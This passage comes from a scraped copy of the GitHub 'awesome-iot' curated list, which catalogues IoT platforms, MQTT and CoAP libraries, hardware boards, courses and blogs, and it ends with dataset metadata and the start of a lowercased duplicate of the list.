expansion.\nIIoT Clouds\nDataXChange - Cloud manufacturing.\ndeviceWISE for Factory - Telit IIoT cloud.\nPredix - Industrial IoT cloud (by General Electric).\nSpace-Time Insight IIoT - Industrial IoT cloud (formerly go-factory.com).\nThingworx - Industrial IoT cloud.\nVoice of the Machine - Industrial IoT cloud (by Parker Hannifin, based on Exosite).\nAPIs\nOGC SensorThings API \u2605 21 \u29d7 15 - The OGC SensorThings API is an OGC standard specification for providing an open and unified way to interconnect IoT devices, data, and applications over the Web\nQeo Tinq \u2605 6 \u29d7 392 - Tinq is completely based on the Qeo publish/subscribe framework produced by Technicolor as explained in the license section.\nMiddleware\nKaa \u2605 234 \u29d7 0 - Kaa open-source middleware platform for building, managing, and integrating connected products with the Internet of Everything.\nKuzzle \u2605 502 \u29d7 0 - An open-source backend with advanced features like real-time pub/sub or geofencing and a multiprotocol interface that supports MQTT, LoRaWAN and more. (Website)\nMeact \u2605 6 \u29d7 43 - task is to get metric from external stuff, write it to and perform various action.\nOpenIoT \u2605 205 \u29d7 0 - The OpenIoT middleware infrastructure will support flexible configuration and deployment of algorithms for collection\nSiteWhere \u2605 61 \u29d7 0 - SiteWhere open-source IoT platform for device connectivity & management, data persistence, processing, integration, and analytics -- both in cloud and on-premise.\nt6 \u2605 21 \u29d7 4 - Data-first IoT platform to connect physical Objects with time-series DB and perform Data Analysis.\nThingSpeak \u2605 743 \u29d7 0 - ThingSpeak is an open source \"Internet of Things\" application and API to store and retrieve data from things using HTTP over the Internet or via a Local Area Network.\nToolkits Include Non-OS\nLayered architecture of JTAG interface and TAP support\nIoT Toolkit \u2605 39 \u29d7 41 - Reference implementation of the smart object API\niot-adk-addonkit \u2605 8 \u29d7 1 - Contains command line scripts for package creation and image creation process and samples for iot products based on RPi2/MBM.\nKinomaJS \u2605 293 \u29d7 0 - A JavaScript runtime optimized for the applications that power IoT devices.\nmacchina.io \u2605 144 \u29d7 0 - An open-source toolkit for building embedded IoT applications that connect sensors, devices and cloud services.\nOpenOCD \u2605 10 \u29d7 34 - OpenOCD provides on-chip programming and debugging support with a layered architecture of JTAG interface and TAP support\npyOCD \u2605 112 \u29d7 0 - Open source python library for programming and debugging ARM Cortex-M microcontrollers using CMSIS-DAP.\nRenode \u2605 81 \u29d7 0 - a virtual development tool for multinode embedded networks.\nData Visualization\nArbela \u2605 12 \u29d7 2 - Rich, Extensible, Customizable, and Configurable Dashboard.\nCrouton \u2605 75 \u29d7 0 - is a dashboard that lets you visualize and control your IOT devices with minimal setup.\nD3.JS \u2605 49188 \u29d7 0 - A JavaScript visualization library for HTML and SVG\nDashing \u2605 10067 \u29d7 0 - Dashing is a Sinatra based framework that lets you build beautiful dashboards.\nDevicePilot - Operational analytics for connected devices (includes free-forever tier).\nECharts \u2605 11457 \u29d7 0 - Echarts is a commercial charting solution originally intended to address the report need of the Company's various business systems.\nFreeboard \u2605 3034 \u29d7 0 - A damn-sexy, open source real-time dashboard builder for IOT and other web mashups. A free open-source alternative to Geckoboard.\nHighCharts \u2605 4949 \u29d7 0 - Highcharts JS, the JavaScript charting framework\niotdashboard \u2605 7 \u29d7 14 - Fast Django server for IOT Devices.\nShelloid \u2605 20 \u29d7 1 - is an open source IoT-ready real-time big data web application platform built using Node.js and Clojure.\nHardware\nAPixel \u2605 8 \u29d7 31 - APixel is a combination of a ESP8266 dev board with a WS2812B (Addressable RGB) LED all in one.\nArduino - open-source electronics platform based on easy-to-use hardware and software.\nArduino ZERO - This board aims to provide a platform for innovative projects in smart IoT devices, wearable technology, high-tech automation, crazy robotics, and much more.\nBeagleBone - BeagleBone Black is a low-cost, community-supported development platform for developers and hobbyists.\nBitsy Bits \u2605 3 \u29d7 36 - is an IoT composite project. This means it has all parts to implement the full user experience.\nCarloop \u2605 6 \u29d7 0 - Make apps for your car using signals from OBD-II, CAN and GPS. Publish data online using the Particle platform.\nCheapduino - CheapDuino is the most cheapest Arduino compatible processor in the world.\nESP8266 Smartwatch \u2605 39 \u29d7 0 - ESP8266 DIY WiFi Smartwatch with MPU-9250, RTC, OLED, FT232, ...\nIntel Galileo - Galileo is a microcontroller board based on the Intel\u00ae Quark SoC X1000 Application Processor, a 32-bit Intel Pentium-class system on a chip\nMicroduino - Microduino is about the size of a quarter and less than half the size of the original Arduino board.\nNodeMCU - a firmware based on ESP8266 wifi-soc.\nPowerduino \u2605 53 \u29d7 102 - A fully programmable power strip with energy monitoring and wireless connectivity.\nPULPino \u2605 201 \u29d7 0 - PULPino is an open-source microcontroller system, based on a small 32-bit RISC-V core developed at ETH Zurich.\nRaspberry Pi - a tiny and affordable computer that you can use to learn programming through fun, practical projects\nSquareWear - An Open-Source Arduino-based Wearable Microcontroller\nTessel - Tessel is a completely open source and community-driven IoT and robotics development. platform.\nWemos - Very-cheap firmware based on ESP8266 wifi-soc.\nWidora \u2605 15 \u29d7 21 - Widora is open source WiFi development hardware prototype with sound card based on MT7688A running OpenWrt.\nHome Automation\nCK.HomeAutomation \u2605 15 \u29d7 9 - The first open source Home Automation SDK for Windows 10 IoT Core.\nEclipse SmartHome - Smart Home adoption will only gain momentum if the different devices can be connected into over-arching use cases, but currently the market for Smart Home systems and IoT gadgets is heavily fragmented.\nFloorplan for Home Assistant \u2605 949 \u29d7 0 - the Home Assistant front end provides a great way of viewing and interacting with your entities.\nheimcontrol.js \u2605 1306 \u29d7 4 - Home-Automation with node.js and Raspberry PI\nhome-assistant \u2605 3237 \u29d7 0 - Open-source home automation platform running on Python 3\nhome.pi \u2605 145 \u29d7 1 - Home Automation with AngularJS and MQTT on a Raspberry Pi\nHomebridge \u2605 3030 \u29d7 0 - Homebridge is a lightweight NodeJS server you can run on your home network that emulates the iOS HomeKit API.\nLumos \u2605 70 \u29d7 1 - aims to change that by pairing with WiFi and uses Machine Learning to adjust the light to match your sleep schedule.\nMagic Mirror \u2605 503 \u29d7 0 - A \u26a1Magic Mirror\u26a1 powered by a UWP Hosted Web App.\nMozilla Smart Home \u2605 4 \u29d7 8 - offers a middle ground between \"in a box\" solutions like Apple Homekit and DIY solutions like Raspberry Pi\nMyController \u2605 110 \u29d7 0 - is automation controller for home, office or any place.\nNinja Blocks - Smart home controller. A computer for the coffee table.\nopenHAB \u2605 2536 \u29d7 0 - a vendor and technology agnostic open source automation software for your home.\nPimatic \u2605 362 \u29d7 0 - A home automation server and framework for the raspberry pi running on node.js.\nPrivateEyePi - Home Automation and Monitoring Projects for Raspberry Pi\nRaZberry - RaZberry brings Z-Wave to the Raspberry PI platform.\nSmart Mirror \u2605 1181 \u29d7 0 - The fairest of them all. A DIY voice controlled smart mirror with IoT integration.\nSonoff-HomeAssistant \u2605 336 \u29d7 1 - is alternative firmware for the brilliant & cheap ($ not quality) range of Sonoff range of ESP-8266 based WiFi controlled switches.\nV\u00f6r \u2605 31 \u29d7 2 - is open source software and hardware for turning your open office into an open, real-time map for finding people, open work places and current events.\nNode-RED - Node-RED is a programming tool for wiring together hardware devices, APIs and online services in new and interesting ways.\nIDE\nAngular 2 IoT \u2605 10 \u29d7 4 - is an experimental technology that allows you to program physical hardware (buttons, LEDs, etc.) using Angular 2.\nDevIoT \u2605 70 \u29d7 1 - Sublime Text plugin for IoT development.\nPlatformio Atom IDE \u2605 108 \u29d7 2 - The next generation integrated development environment for IoT.\nStino \u2605 1280 \u29d7 1 - is a Sublime Text plugin that provides an Arduino-like environment for editing, compiling and uploading sketches.\nWyliodrinSTUDIO \u2605 25 \u29d7 2 - Wyliodrin STUDIO is a Chrome based IDE for software and hardware development for IoT and Embedded Linux systems.\nRobotics\nAirSim \u2605 2606 \u29d7 1 - is a simulator for drones (and soon other vehicles) built on Unreal Engine.\nartoo \u2605 1269 \u29d7 0 - Ruby framework for robotics and the Internet of Things.\nhubot \u2605 10481 \u29d7 0 - A customizable life embetterment robot.\nOthers\nfor embedded systems (IoT in mind).\nAWS IoT Button logger to git \u2605 4 \u29d7 2 - A beginner-friendly AWS Lambda function that logs events from IoT devices into a git repository of your choice. Written in TypeScript, tested with Jest, compiled with Parcel. Uses Azure Pipelines for CI/CD.\nCorto \u2605 15 \u29d7 4 - Corto is a tested, proven architecture for normalizing data from different technologies into one view regardless of location, format or datamodel.\nEmul8 \u2605 50 \u29d7 71 - is an emulator of various embedded systems. With Emul8 you can develop embedded software entirely in a virtual environment that runs within your PC.\nESP8266 Deauther \u2605 3806 \u29d7 0 - allows you to perform a deauth attack with an ESP8266 against selected networks.\nfluent-bit \u2605 90 \u29d7 4 - is a data collector for Linux, Embedded Linux, OSX and BSD family operating systems.\nKamanja \u2605 21 \u29d7 1 - is an open-source continuous decisioning engine that is hardened for enterprise reliability requirements, scalable to IoT level data volumes, and enables low latency use cases.\nNode-RED \u2605 2513 \u29d7 0 - A visual tool for wiring the Internet of Things.\nParlay \u2605 8 \u29d7 160 - is software that brings visibility and accessibility to embedded devices.\nredzilla \u2605 13 \u29d7 37 - is a service which allow to create easily instances of node-red.\nRemoteDebug \u2605 17 \u29d7 11 - A library to remote debug over telnet connection!\nrio \u2605 68 \u29d7 0 - An open source library allowing you to create an internet connected LED wall\nSonoff-Tasmota \u2605 4869 \u29d7 0 - Provide ESP8266 based itead Sonoff with Web, MQTT and OTA firmware using Arduino IDE.\ntinyVP \u2605 12 \u29d7 48 - is a very small and lean hypervisor using MIPS R5 hardware VZ option\nvorto \u2605 32 \u29d7 3 - is a toolset that lets you describe devices using a simple language and share these descriptions, so-called Information Models, in a centralized Vorto Repository.\nLanguage\nAtomVM \u2605 390 \u29d7 0 - AtomVM is a tiny portable virtual machine that allows Erlang and Elixir code to run on microcontrollers with less than 500KB of RAM such as the ESP32.\nELIoT \u2605 76 \u29d7 48 - Extensible Language for Everyday (and the Internet of Things)\neLua \u2605 393 \u29d7 1 - Quickly prototype and develop embedded software applications with the power of Lua and run them on a wide range of microcontroller architectures.\nESP Basic \u2605 144 \u29d7 0 - Basic Interpreter for the ESP8266\nJerryScript \u2605 1244 \u29d7 0 - A JavaScript engine for Internet of Things.\nluvit \u2605 2237 \u29d7 0 - Node.JS for the Lua Inventor.\nMicroPython \u2605 3070 \u29d7 0 - MicroPython is a lean and fast implementation of the Python 3 programming language that is optimised to run on a microcontroller.\nszl \u2605 100 \u29d7 0 - is a tiny, embeddable scripting engine inspired by Tcl and shell.\nTerra \u2605 1248 \u29d7 0 - is a low-level system programming language that is embedded in and meta-programmed by the Lua programming language.\nV7 \u2605 576 \u29d7 0 - V7 is a JavaScript engine written in C. It makes it possible to program Internet of Things (IoT) devices in JavaScript.\nPikaScript \u2605 88 \u29d7 0 - PikaScript is a extremely lightweight python engine that can run with less than 4KB of RAM such as stm32g030c8 and stm32f103c8. It is zero dependency, zero configuration, easy to deploy and expand.\nOthers\nESP8266-Wifi-Relay \u2605 31 \u29d7 19 - ESP8266-ESP12e Wifi Doppel Relay IOT Unterputz Montage m\u00f6glich / Schaltaktor.\nK3PO \u2605 22 \u29d7 9 - is a network driver and language agnostic testing tool.\nLittleD \u2605 545 \u29d7 3 - A relational database for embedded devices and sensors nodes.\nmbed TLS \u2605 601 \u29d7 0 - An open source, portable, easy to use, readable and flexible SSL library\nMongoose Flashing Tool \u2605 36 \u29d7 7 - Mongoose Flashing Tool (also called MFT) is the Mongoose IoT Platform flashing tool.\nUniK \u2605 593 \u29d7 0 - is a tool for compiling application sources into unikernels (lightweight bootable disk images) rather than binaries.\nProtocol Library\nMQTT\nAphid \u2605 58 \u29d7 4 - A lightweight MQTT 3.1.1 client written in pure Swift 3.\narduino-mqtt \u2605 95 \u29d7 6 - MQTT library for Arduino based on the Eclipse Paho projects.\nEclipse Paho JavaScript client \u2605 510 \u29d7 1 - The Paho JavaScript Client is an MQTT browser-based client library written in Javascript that uses WebSockets to connect to an MQTT Broker.\nEclipse Paho MQTT C client \u2605 142 \u29d7 3 - This code builds libraries which enable applications to connect to an MQTT broker to publish messages, and to subscribe to topics and receive published messages.\nEMQ X \u2605 5270 \u29d7 996 - Scalable and Reliable Real-time MQTT Messaging Engine for IoT in 5G Era.\nESP8266 MQTT \u2605 440 \u29d7 0 - MQTT client library for ESP8266 Soc\nEspruna - Firmware for ESP8266 based smart switches. Includes Web GUI, MQTT and AOT software updates.\ngLeam \u2605 50 \u29d7 108 - A operation cluster based on MQTT.\nHiveMQ - a MQTT broker and MQTT client in Java.\nHomie for ESP8266 \u2605 115 \u29d7 1 - An Arduino for ESP8266 implementation of Homie, an MQTT convention for the IoT.\nHomie Server \u2605 45 \u29d7 3 - A Web server for Homie, an MQTT convention for the IoT.\nJava mqtt-client \u2605 405 \u29d7 2 - A Java MQTT Client.\nLightMQTT \u2605 32 \u29d7 11 - is a lightweight MQTT client, written in Swift.\nm2mqtt \u2605 69 \u29d7 11 - MQTT Client Library for .Net and WinRT.\nmicroTT \u2605 673 \u29d7 1 - is a lightweight and efficient MQTT broker designed to raise the bar for pub/sub performance.\nmoquette \u2605 309 \u29d7 2 - Java MQTT lightweight broker.\nmosca \u2605 1097 \u29d7 0 - Mosca is a node.js mqtt broker.\nMosquitto \u2605 158 \u29d7 0 - An Open Source MQTT v3.1/v3.1.1 Broker.\nMQTT Explorer - Tool to visualize your MQTT topics in a topic hierarchy, a MQTT swiss-army knife.\nMQTT Kafka Bridge \u2605 28 \u29d7 35 - Bridge which consumes MQTT messages and republishes them on Kafka on the same topic.\nMQTT-C \u2605 52 \u29d7 2 - A portable MQTT C client for embedded systems and PCs alike.\nMQTT.js \u2605 1359 \u29d7 0 - The MQTT client for Node.js and the browser.\nneurite \u2605 4 \u29d7 5 - A serial to MQTT bridge, an easier way to build IoT product with esp8266 Arduino.\npaho.mqtt.wxapp \u2605 196 \u29d7 0 - paho.mqtt.javascript\u53ef\u4ee5\u8ba9\u4f60\u5728\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u91cc\u8fde\u63a5MQTT broker\uff0c\u5b9e\u73b0\u5728\u5c0f\u7a0b\u5e8f\u91cc\u63a7\u5236\u786c\u4ef6\uff0c\u4e5f\u53ef\u7528\u4e8e\u6e38\u620f\u3002\nPubSub Client \u2605 684 \u29d7 0 - A client library for the Arduino Ethernet Shield that provides support for MQTT.\nstrong-pubsub \u2605 97 \u29d7 1 - PubSub for Node.js, Browser, Mobile and IoT\nSurgeMQ \u2605 776 \u29d7 1 - is a high performance MQTT broker and client library that aims to be fully compliant with MQTT 3.1 and 3.1.1 specs.\nVerneMQ \u2605 561 \u29d7 1 - A distributed MQTT message broker.\nWolfSSL MQTT \u2605 155 \u29d7 14 - A C MQTT library that works with WolfSSL.\nWaterstream - MQTT broker leveraging Apache Kafka as its own storage and distribution engine.\nNanoMQ - A light-weight and Blazing-fast MQTT Broker for IoT Edge platform.\nCoAP\nCalifornium \u2605 36 \u29d7 0 - Californium is a Java implementation of CoAP for the IoT backend and less constrained IoT devices.\nCoAP.NET \u2605 47 \u29d7 4 - A C# implementation of the CoAP protocol.\nCopper \u2605 46 \u29d7 14 - A Firefox add-on to browse the Internet of Things.\nGo CoAP \u2605 110 \u29d7 8 - Implementation of CoAP in go.\nh5.coap \u2605 36 \u29d7 26 - Implementation of the Constrained Application Protocol (CoAP) client for node.js.\niCoAP \u2605 28 \u29d7 21 - Objective-C Client Implementation of CoAP.\nlobaro-coap \u2605 74 \u29d7 4 - Complete CoAP Implementation in C.\nmbed CoAP \u2605 23 \u29d7 11 - makes it easy to integrate a Java SE enabled device with coap based services like mbed Cloud.\nmicrocoap \u2605 259 \u29d7 10 - A small CoAP implementation for microcontrollers.\nMQTT Client Framework \u2605 312 \u29d7 1 - iOS, OSX, tvOS native ObjectiveC MQTT Client Framework.\nNode CoAP \u2605 176 \u29d7 11 - node-coap is a client and server library for CoAP modeled after the http module.\nPython CoAP \u2605 36 \u29d7 5 - A CoAP Python library.\nSwiftCoAP \u2605 22 \u29d7 12 - Swift Server/Client Implementation of CoAP.\ntxThings \u2605 48 \u29d7 3 - CoAP library for Twisted framework.\nSpark\nspark-protocol \u2605 81 \u29d7 14 - Node.JS module for hosting direct encrypted CoAP socket connections.\nspark-server \u2605 371 \u29d7 13 - An API compatible open source server for interacting with devices speaking the spark-protocol\nWeMo\narduino-esp8266-alexa-multiple-wemo-switch \u2605 213 \u29d7 0 - #Arduino Esp8266 Alexa Multiple Belkin wemo switch emulator.\narduino-esp8266-alexa-wemo-switch \u2605 213 \u29d7 5 - Amazon Alexa + WeMos switch made with Arduino D1 Mini.\nfauxmo \u2605 430 \u29d7 0 - Emulated Belkin WeMo devices that work with the Amazon Echo.\nhomebridge-platform-wemo \u2605 106 \u29d7 24 - Belkin WeMo Platform plugin for the awesome Homebridge project.\nouimeaux \u2605 319 \u29d7 0 - Open source control for Belkin WeMo devices.\nwemo.js \u2605 19 \u29d7 288 - This library aims to provide a simple interface to a Belkin WeMo Power Sockets.\nwemore \u2605 26 \u29d7 10 - A more awesome library for Belkin WeMo interactions.\nSMCP\nSMCP \u2605 55 \u29d7 0 - is an experimental CoAP-based machine-to-machine (M2M) protocol that is in the early stages of development.\nLora\nLoRa Gateway Bridge \u2605 78 \u29d7 0 - is a service which abstracts the packet_forwarder UDP protocol running on most LoRa gateways into JSON over MQTT.\nLoRa Server \u2605 237 \u29d7 0 - LoRa Server is an open-source LoRaWAN network-server.\nLoRaPI \u2605 28 \u29d7 31 - Raspberry PI Lora Gateway/Node for RFM92/95/96/98/69HCW Modules.\nLowCostLoRaGw \u2605 161 \u29d7 4 - Low-cost LoRa IoT & gateway with SX1272/76, Raspberry and Arduino.\nOSGP\nOSGP Platform \u2605 35 \u29d7 7 - is an open, generic, scalable and independent 'Internet of Things' platform, which enables various connected smart objects in the public space to be easily controlled and monitored.\nOpenThread\nOpenThread \u2605 1139 \u29d7 2 - OpenThread is an open-source implementation of the Thread networking protocol.\nOpenThread Border Router \u2605 64 \u29d7 0 - An open source border router, built to work with OpenThread.\nOthers\nAnjay \u2605 16 \u29d7 23 - is a C library that aims to be the reference implementation of the OMA Lightweight Machine-to-Machine (LwM2M) device management protocol.\nlibimobiledevice \u2605 2294 \u29d7 0 - A library to communicate with services of Apple iOS devices using native protocols.\nMeQ \u2605 920 \u29d7 1 - is a real-time communication service for connecting online devices.\nOSS-7 \u2605 44 \u29d7 37 - is an open source implementation of the DASH7 Alliance protocol for ultra low power wireless sensor communication.\nFork\nAWS IoT Button \u2605 5 \u29d7 4 - Emulate the AWS IoT Button on a Raspberry Pi with a simple push button using this C++ sample.\nHardware Com\nBluetooth\nBluetoothLinux is a Pure Swift Linux Bluetooth Stack.\nBluetoothSerial \u2605 863 \u29d7 0 - Cordova (PhoneGap) Plugin for Serial Communication over Bluetooth\nReact Native Bluetooth Serial \u2605 299 \u29d7 2 - React Native version of BluetoothSerial plugin. For both android and ios\nNFC\nAdafruit_NFCShield_I2C \u2605 110 \u29d7 13 - I2C Driver for Adafruit's PN532-based NFC Shield\nChrome App NFC Library \u2605 117 \u29d7 4 - With this simple library, you can build a Chrome App that communicates over USB with NFC Readers.\nLibLogicalAccess \u2605 53 \u29d7 17 - C++ RFID Library for Windows/Linux/Mac. For PC/SC, NFC, ISO compliant and proprietary hardware.\nlibnfc \u2605 119 \u29d7 4 - Platform independent Near Field Communication library.\nNFC Tools for Java \u2605 183 \u29d7 26 - NFCTools is a collection of libraries and tools for NFC in Java.\nNode NFC \u2605 41 \u29d7 38 - A first try at binding libnfc to node.\nRFIDIOt \u2605 314 \u29d7 6 - python RFID / NFC library & tools.\nSerial\nrxtx \u2605 67 \u29d7 4 - a Java cross platform wrapper library for the serial port\nOthers\nBalena \u2605 329 \u29d7 3 - is a new container engine purpose-built for embedded and IoT use cases and compatible with Docker containers.\nDrake \u2605 500 \u29d7 0 - is a toolbox maintained by the Robot Locomotion Group at the MIT Computer Science and Artificial Intelligence Lab (CSAIL).\nIBM messaging - Community around IBM Messaging products.\nIotWeb \u2605 4 \u29d7 9 - A Embedded HTTP and WebSocket Server for UWP/.NET 4.5.\nMender: Deployment Service \u2605 8 \u29d7 14 - Microservice for managing software deployments for IIoT devices within Mender ecosystem.\nmeshblu \u2605 738 \u29d7 0 - Machine-to-machine instant messaging platform for the internet of things.\nPython Enocean \u2605 13 \u29d7 45 - A Python library for reading and controlling EnOcean devices.\nReact Native ESP8266 Smartconfig \u2605 75 \u29d7 5 - a react-native module for ESP8266 ESPTOUCH Smart config.\nServo \u2605 7821 \u29d7 0 - is a prototype web browser engine written in the Rust language.\nShellHub \u2605 702 \u29d7 70 - Centralized SSH for the the edge and cloud computing.\nThe Things Network \u2605 67 \u29d7 4 - The Things Network is a global open crowdsourced Internet of Things data network.\nThe Things Network Arduino Library \u2605 82 \u29d7 9 - is an Arduino Library for Arduino devices like The Things Uno and Node to communicate via The Things Network.\nWAMP Protocol \u2605 228 \u29d7 1 - The Web Application Messaging Protocol The Web Application Messaging Protocol.\nSoftware\nCopper \u2605 46 \u29d7 14 - A Firefox add-on to browse the Internet of Things\nProcessing \u2605 2644 \u29d7 0 - Processing is a flexible software sketchbook and a language for learning how to code within the context of the visual arts.\nTools\nPaho - The Paho project provides open-source client implementations of MQTT and MQTT-SN messaging protocols aimed at new, existing, and emerging applications for Machine\u2011to\u2011Machine (M-2-M) and Internet of Things (IoT).\nSmart.js \u2605 487 \u29d7 0 - Embedded Javascript engine for C/C++ with networking, file, database and device interfaces\nVoice\nchelexa \u2605 2 \u29d7 25 - Natural voice recognition IoT cloud chess solution via the Amazon Echo platform.\nMycroft - Mycroft is the world\u2019s first open source voice assistant.\nResources-Websites-Projects\nCourse\nAdvanced Penetration Testing - Free\nAn Introduction to Programming the Internet of Things (IOT) Specialization - Landing page of 6 courses (Introduction to the Internet of Things and Embedded Systems / The Arduino Platform and C Programming / Interfacing with the Arduino / The Raspberry Pi Platform and Python Programming for the Raspberry Pi / Interfacing with the Raspberry Pi / Programming for the Internet of Things Capstone).\nArchitecting Smart IoT Devices - Free\nBuild an Intelligent System: From Embedded to Cloud (NOT FREE) - None\nCryptography - Free\nCyber Security Graduate Certificate - Courses: Operating Systems and Systems Programming, Introduction to Computer Networking, Computer and Network Security, Bitcoin and Crypto Currencies, Introduction to Cryptography, Technology and National Security (Paid).\nIntroduction to Architecting Smart IoT Devices - Free\nLow-Level Software Security: Attacks and Countermeassures - None\nPenetration Testing and Ethical Hacking - Free\nSecure Coding - Free\nServerless Reference Architecture: IoT Backend \u2605 134 \u29d7 3 - demonstrates how to use AWS Lambda in conjunction with Amazon Kinesis, Amazon DynamoDB, Amazon Simple Storage Service (Amazon S3), and Amazon CloudWatch to build a serverless system for ingesting and processing sensor data.\nSocial Engineering and Manipulation - Free\nSoftware Architecture for the Internet of Things - Free\nStanford Advanced Computer Security Certificate - Required courses: Using Cryptography Correctly, Writing Secure Code, Exploiting and Protecting Web Applications; Elective courses: Software Security Foundations, Mobile Security, Network Security, Emerging Threats & Defenses (Paid).\nWeb Application Penetration Testing - Free\nWeb Connectivity and Security in Embedded Systems - Free\nWebSite\nEclipse IoT - Eclipse Foundation IoT top level project and working group.\nHackaday - Discover. Get inspired. Repeat. Hack things for the better.\nIBM IoT - IBM DeveloperWorks for IoT\nInfoq IoT Weekly - Weekly IoT News, Open Source Project, Hardware\nInstructables - tech - Explore the Biggest How To and DIY community where people make and share inspiring, entertaining, and useful projects, recipes, and hacks.\nMakezine - DIY Projects and Ideas for Makers.\nBlog\nArduino Create - None\nhttp://edi.wang/ - ASP.NET, Windows 10 IoT\nIBM DeveloperWorks IoT - None\nIBM IoT Blog - None\nIndustrial IoT blog - \"Industrial IoT/Industrie 4.0 Viewpoints\".\nIntel IoT Blog - None\nMicrosoft IoT Blog - None\n\u552f\u7b11\u5fd7\u5728-ServerSuperIO - None\nBosch ConnectedWorld Blog - IoT articles from the world of Bosch.\nIoT for All - High-quality IoT content, resources, and news.\nGroup\nGuokr DIY - A Chinese DIY Group.\nGitHub Org.\nIntel iot-devkit libraries - Official github repo for Intel IoT developer kit libraries & samples\nMicrosoft IoT - Microsoft IoT Team\nThe Hybrid Group - the create of cylon.js\nFree Book\nDesign IoT \u2605 594 \u29d7 0 - A Ebook to tech your create IoT System step by step.\nIoT-Firstep \u2605 24 \u29d7 9 - A Ebook to tech your create IoT System.\nIPv6-WSN-Book - an easy guide to Wireless Sensor Networks (WSN), IPv6 and the Internet of Things (IoT).\nUsing the Web to Build the IoT - A collection of six hand-picked chapters that introduce the key technologies and concepts for building the application layer of the IoT.\nRelated Resources Projects\nawesome-embedded-systems \u2605 0 \u29d7 29 - The website awesome-embedded-systems.org lists resources about embedded system, software and hardware development.\nawesome-mqtt \u2605 668 \u29d7 0 - Curated list of MQTT related stuff.\nTutorial\nmicro-services-tutorial-iot \u2605 20 \u29d7 13 - An instructor led microservices workshop.\nUnpacking the Internet of Things - Shows use cases to help to identify possible potential for enterprise specific products.\nArduino, RaspberryPi and MQTT - Builds an end to end IoT application that ties together several aspects of the MQTT protocol.\nEdge\nAREG SDK \u2605 15 \u29d7 0 - AREG SDK is a developer-friendly, an interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected Things interact and provide services, as if they act like thin distributed servers.\nEden \u2605 25 \u29d7 0 - CLI for Edge Virtualization Engine (EVE)\nProject Flogo \u2605 207 \u29d7 0 - is an Open Source Framework for IoT Edge Apps & Integration.\nAI\nELL \u2605 1859 \u29d7 0 - allows you to build and deploy machine-learned pipelines onto embedded platforms, like Raspberry Pis, Arduinos, micro:bits, and other microcontrollers.\nlibdeep - A deep learning library for C/C++.\nMachinery \u2605 174 \u29d7 0 - is a low-budget video surveillance solution, that uses computer vision algorithms to detect changes, and that can trigger other devices.\nTensorFlow for Raspberry Pi \u2605 317 \u29d7 0 - step-by-step instructions for installing TensorFlow from source using Bazel (which is also compiled from-scratch), as well as pre-built TensorFlow binaries.\nAnalytics\nBistro \u2605 321 \u29d7 0 - light-weight batch and stream analytics engine which radically changes the way data is processed. Bistro relies on a novel column-oriented data model and is intended for IoT applications and data processing at the edge.\nNetData \u2605 18973 \u29d7 0 - is a system for distributed real-time performance and health monitoring.\nPiwik \u2605 5374 \u29d7 0 - Piwik is the leading Free/Libre open analytics platform.\nSamsara \u2605 64 \u29d7 1 - is a real-time analytics platform.\nDigital Twins\nEclipse Ditto is the open-source project of Eclipse IoT that provides a ready-to-use functionality to manage the state of Digital Twins.\nOthers\nconnectthedots \u2605 307 \u29d7 0 - Connect tiny devices to Microsoft Azure services to build IoT solutions\ndjango-th \u2605 275 \u29d7 0 - take the control of your data with this opensource clone of IFTTT, a bridge between your internet services.\nsouliss \u2605 137 \u29d7 8 - Arduino based Distributed Networking Framework for Smart Homes and IoT.\nContributing\nYour contributions are always welcome! Please submit a pull request or create an issue to add a new framework, library or software to the list. Do not submit a project that hasn\u2019t been updated in the past 6 months or is not awesome.", "link": "https://github.com/phodal/awesome-iot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome iot\na curated list of iot. everyone can contribute here!\nsimliar projects\nawesome azure iot - a curated list of awesome azure internet of things projects and resources.\nawesome android things - a curated list of awesome android things tutorials, libraries and much more at one place\nawesome openiot - a curated list of awesome open source iot frameworks, libraries and software.\nawesome iot - a curated list of awesome internet of things projects and resources.\ntoc\nframework\nlibrary\nsdk\narduino\nlow level\napp\nstorage\nsecurity\nos\nandroid things\nvoice controller\nplatform\niot clouds\niiot clouds\napis\nmiddleware\ntoolkits include non-os\ndata visualization\nhardware\nhome automation\nide\nrobotics\nothers\nlanguage\nothers\nprotocol library\nmqtt\ncoap\nspark\nwemo\nsmcp\nlora\nopenthread\nothers\nfork\nhardware com\nnfc\nserial\nothers\nsoftware\ntools\nvoice\nai\nresources-websites-projects\ncourse\nwebsite\nblog\ngroup\ngithub org.\nfree book\nrelated resources projects\ntutorial\nedge\nanalytics\nothers\nframework\n.net core iot \u2605 1193 \u29d7 292 - a set of libraries to interact with sensors, displays and input devices from .net core framework. this libraries allows to work with the gpio port for various boards like raspberry pi and hummingboard and contains a growing set of community-maintained device bindings for iot components.\nareg sdk \u2605 15 \u29d7 0 - areg sdk is a developer-friendly, an interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected things interact and provide services, as if they act like thin distributed servers.\ncylon \u2605 2339 \u29d7 0 - javascript framework for robotics, physical computing, and the internet of things.\ndevify-server \u2605 53 \u29d7 1 - s extremely light weight, and is very easy to use. it aims to help developers to create iot application servers, faster.\nepoc.js \u2605 27 \u29d7 0 - this framework provides an interface to access data from the emotiv epoc brain sensor using node.js.\nesp-idf \u2605 2542 \u29d7 0 - the official framework from espressif to build wi-fi, ble, and bt apps with esp32.\nfoglight \u2605 10 \u29d7 100 - is a lightweight runtime that enables makers of all ages and skill levels to create highly performant apps for embedded devices like raspberry pis.\nframboos \u2605 75 \u29d7 3 - is a small java wrapper around the default gpio driver on linux boards like raspberry pi and beagleboard.\nfreedomotic \u2605 208 \u29d7 4 - is an open source, flexible, secure internet of things (iot) application framework, useful to build and manage modern smart spaces.\ngobot \u2605 2062 \u29d7 1 - golang framework for robotics, physical computing, and the internet of things.\ngrow iot \u2605 7 \u29d7 7 - is a full javascript based iot stack with a simple api and basic user interface.\nguh \u2605 50 \u29d7 29 - is an open source iot (internet of things) server, which allows to control a lot of different devices from many different manufacturers.\nheimcontrol.js \u2605 1306 \u29d7 4 - home-automation with node.js and raspberry pi.\niot 433 mhz \u2605 121 \u29d7 11 - iot system to control 433 mhz rc power sockets, pir, door sensors and much more.\niot edge \u2605 264 \u29d7 0 - the azure iot gateway sdk was our first step to enabling edge analytics in iot solutions.\niot sol \u2605 38 \u29d7 0 - the total solution that provides visual graphical programming for developing iot applications.\niotcloud 2 \u2605 14 \u29d7 50 - an open source framework for iot and sensor centric applications.\njohnny-five 